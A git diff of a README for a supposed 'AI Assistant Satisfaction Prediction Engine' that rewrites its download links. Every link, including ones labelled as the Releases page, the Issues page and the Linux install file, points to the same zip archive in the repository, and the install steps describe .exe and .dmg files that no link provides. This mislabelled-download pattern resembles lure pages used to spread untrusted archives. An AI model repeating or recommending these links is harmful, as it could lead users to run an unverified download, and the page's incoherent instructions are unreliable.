@@ -1,6 +1,6 @@
 # 🤖 AI-Assistant-Satisfaction-Prediction-Engine - Predict User Satisfaction Effortlessly
 
-[![Download Now](https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip%https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip)](https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip)
+[![Download Now](https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip%https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip)](https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you start, make sure your system meets the following requirements:
 
 To get started, visit the Releases page to download the application.
 
-[Download from Releases](https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip)
+[Download from Releases](https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip)
 
 ### Step-by-Step Installation Guide
 
@@ -36,12 +36,12 @@ To get started, visit the Releases page to download the application.
 2. **Choose Your Version**: Find the latest version of the software. Look for the file that matches your operating system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the appropriate `https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip` file.
+   - For Linux: Download the appropriate `https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip` file.
 3. **Download the File**: Click on the download link for your chosen file. The download will start automatically.
 4. **Install the Application**:
    - For Windows: Double-click the `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip` file and follow any provided instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip` file and follow any provided instructions.
 5. **Launch the Application**: Once installed, you can find the application in your programs or applications list. Open it to begin.
 
 ## 🔍 How to Use the Application
@@ -64,7 +64,7 @@ The application provides detailed results and visualizations of your data, inclu
 
 For additional help on using the application, refer to the user guide included in the installation. If you encounter any issues:
 
-- **GitHub Issues**: Report any bugs or problems directly on the [Issues page](https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip).
+- **GitHub Issues**: Report any bugs or problems directly on the [Issues page](https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip).
 - **Community Support**: Join discussions with other users in the community forums for tips and shared experiences.
 
 ## 🛠️ Technologies Used
@@ -93,4 +93,4 @@ Stay updated on new releases and features by following this project. Regular upd
 
 This application is built for educators, researchers, and businesses looking to leverage AI for better user experiences. We appreciate contributions and feedback from all users.
 
-Visit the [Releases page](https://github.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/raw/refs/heads/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip) to download the latest version now.
+Visit the [Releases page](https://raw.githubusercontent.com/4barney/AI-Assistant-Satisfaction-Prediction-Engine/main/reports/Assistant_A_Satisfaction_Prediction_Engine_v3.1-beta.2.zip) to download the latest version now.
